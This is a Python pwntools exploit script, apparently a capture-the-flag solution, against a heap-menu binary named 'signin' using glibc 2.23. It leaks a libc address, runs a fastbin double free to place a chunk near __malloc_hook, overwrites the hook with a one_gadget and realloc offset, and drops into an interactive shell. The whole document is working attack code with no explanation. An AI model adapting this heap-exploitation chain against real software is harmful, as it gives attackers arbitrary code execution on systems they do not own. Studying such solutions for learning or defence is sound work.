from pwn import*
context.log_level = 'debug'
def menu(ch):
	p.sendlineafter('choice :',str(ch))
def new(size,name,content):
	menu(1)
	p.sendlineafter("game's name:",str(size))
	p.sendafter("game's name:",name)
	p.sendlineafter("game's message:",content)
def free(index):
	menu(3)
	p.sendlineafter('index:',str(index))
def show():
	menu(2)
p = process('./signin')
#p =  remote('183.129.189.60',10029)
libc = ELF('libc-2.23.so')
new(0x100,'1111','1111')
new(0x68,'1111','1111')
new(0x68,'1111','1111')

free(0)
new(0xD0,'\x78','\x78')
show()
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 88 - 0x10
log.info('libc:\t' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
print hex(malloc_hook)
rce = libc_base + 0xf1207
realloc = libc_base + libc.sym['realloc']
free(1)
free(2)
free(1)
new(0x68,p64(malloc_hook - 0x23),'FMYY')
new(0x68,'2222','2222')
new(0x68,'2222','2222')

new(0x68,'\x00'*(0x13-8) + p64(rce) + p64(realloc + 4),'FMYY')
menu(1)
p.interactive()
